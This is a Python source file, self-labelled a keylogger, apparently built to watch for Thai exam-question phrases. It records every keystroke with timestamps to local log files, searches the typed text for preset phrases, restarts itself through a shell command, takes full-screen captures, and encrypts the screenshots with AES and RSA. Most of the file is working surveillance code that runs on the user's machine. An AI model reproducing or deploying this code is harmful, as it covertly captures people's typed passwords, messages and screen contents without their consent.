from pynput.keyboard import Listener
from mss import mss
import datetime
import ctypes
import time
import subprocess
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Hash import SHA512
from Crypto import Random
from Crypto.Util.Padding import pad, unpad

def get_keyboard_language(): 

    languages={'0x41e' : "Thai", '0x409' : "English - United States", '0x809' : "English - United Kingdom", '0x0c09' : "English - Australia", '0x2809' : "English - Belize",
                 '0x1009' : "English - Canada", '0x2409' : "English - Caribbean", '0x3c09' : "English - Hong Kong SAR", '0x4009' : "English - India", '0x3809' : "English - Indonesia",
                 '0x1809' : "English - Ireland", '0x2009' : "English - Jamaica", '0x4409' : "English - Malaysia", '0x1409' : "English - New Zealand", '0x3409' : "English - Philippines",
                 '0x4809' : "English - Singapore", '0x1c09' : "English - South Africa", '0x2c09' : "English - Trinidad", '0x3009' : "English - Zimbabwe"}

    user32 = ctypes.WinDLL('user32', use_last_error=True)

    # Get the current active window handle
    handle = user32.GetForegroundWindow()

    # Get the thread id from that window handle
    threadid = user32.GetWindowThreadProcessId(handle, 0)

    # Get the keyboard layout id from the threadid
    layout_id = user32.GetKeyboardLayout(threadid)

    # Extract the keyboard language id from the keyboard layout id
    language_id = layout_id & (2 ** 16 - 1)

    # Convert the keyboard language id from decimal to hexadecimal
    language_id_hex = hex(language_id)

    # Check if the hex value is in the dictionary.
    if language_id_hex in languages.keys():
        return languages[language_id_hex]
    else:
        # Return language id hexadecimal value if not found.
        return str(language_id_hex)

# keyloger
def keystroke(key):

    ch = 0
    lt = 0
    new = 0
    searchword = ''
    t = str(datetime.datetime.now().strftime("\n%H : %M : %S>> "))
    key = str(key).replace("'","")

    if key == "\\x03":
        lt = 0
        ch = 1
        key = "_Copy"
        # capturekey("_Copy")
    if key == "\\x16":
        lt = 0
        ch = 1
        key = "_Paste"
        # capturekey("_Paste")
    if key == "\\x06":
        lt = 0
        ch = 1
        key = "_search"
        # capturekey("_Search")
    if key == "Key.print_screen":
        lt = 0
        ch = 1
        key = "_print screen"
        # capturekey("_printsct")
    if not("Key" in key) and (ch == 0):
        lt = 1    
    else :
        if ("Key.cmd" in key) or ("Key.space" in key):
            key = key
        else:
            key = key +'\n'
        lt = 0

    if "Key.shift" in key:
        pass
    else:
        with open("Temp/log_data.txt", 'a') as f:
            if lt:
                if "`" in key:
                    f.write("\n" + key)
                else:
                    f.write(key)
            else:
                if ("Key.space" in key):
                    f.write(' '+key + '\n')
                else:
                    f.write(t + key)
                ch = 0

        filecheck = "checklog_data.txt"
        with open(filecheck, 'a') as f:
            if lt:
                if "`" in key:
                    f.write("\n" + key)
                else:
                    f.write(key)
            else:
                if ("Key.space" in key):
                    f.write(key + '\n')
                else:
                    f.write(t + key)
                ch = 0
        if (lt==1) or (key == "Key.space"):
            with open(filecheck, 'r') as f:
                searchword = f.read()
            wordkey =  ['ข้อนี้ตอบอะไร', 'ตอบอะไร', 'ทำยังไง', 'ได้เท่าไหร่', 'มีอะไรบ้าง']    

            for key_word in wordkey:
                if key_word in searchword:
                    print("detect : " + searchword + '\n')
                    new = 1
            if 'Key.cmdKey.space' in searchword:
                with open(filecheck, 'w') as f:
                    f.write('')
                print("restart....\n")
                # print("เปลี่ยนแล้วนะ\n")
                time.sleep(0.5)
                subprocess.Popen("python material/keylogger.py", shell=True)
                return False
            if new:
                with open(filecheck, 'w') as f:
                    f.write('')

'''
    with open("Temp/log_data.txt", 'a') as f:
        if lt:
            f.write(key)
        else:
            f.write(t + key)
            ch = 0
'''

# capture
def capturekey(k):
    time.sleep(1.2)
    
    x = str(datetime.datetime.now().strftime("%d %b %Y_%H%M%S"))
    x = 'Temp\\Capture\\'+ x + k + '.jpg'

    with mss() as sct:
        sct.shot(mon=-1, output=x)

    with open('Temp/Capture.txt', 'a') as f:
        f.write(x + '\n')

    # encrypt(x)

def encrypt(file):
    print("encrypt\n")
    with open(file, 'rb') as f:
        picture = f.read()
    
    picture = pad(picture,AES.block_size)

    # print("picture : ",picture)

    aes_key = 'File_Generate/AESkey'
    with open(aes_key, 'rb') as f:
        k = f.read()
    
    cipher = AES.new(k, AES.MODE_CBC)
    data = cipher.encrypt(picture)
    datac = cipher.iv + data

    # print("cipher : ",cipher)
    # print("data : ",data)
    # print("dataiv : ",datac)

    digest = SHA512.new()
    digest.update(datac)
    # print("datac : ",digest.digest())
    
    pub = RSA.import_key(open('File_Generate/Public_Key.pem').read())
    pubkey = PKCS1_v1_5.new(pub)
    enc = pubkey.encrypt(digest.digest())

    with open(file, 'wb') as f:
        f.write(enc)
        f.write(datac)

    # decrypt(file)
    
def decrypt(file):
    print("decrypt\n")
    aes_key = 'File_Generate/AESkey'
    with open(aes_key, 'rb') as f:
        k = f.read()

    with open(file, 'rb') as f:
        lock = f.read(256)
        text = f.read()

    pvt = RSA.import_key(open('File_Generate/Private_Key.pem').read())
    pvtkey = PKCS1_v1_5.new(pvt)
    obj = pvtkey.decrypt(lock, Random.new().read)

    digest = SHA512.new()
    digest.update(text)
    # print("text : ",digest.digest())

    if obj == digest.digest() :
        print("true")

        with open(file, 'wb') as f:
            f.write(text)

        with open(file, 'rb') as f:
            iv = f.read(16)
            data = f.read()
        cipher = AES.new(k, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(data)

        plaintext = unpad(plaintext, AES.block_size)

        with open(file, 'wb') as f:
            f.write(plaintext)

    else :
        print("false")

with Listener(on_press=keystroke) as l:
    l.join()
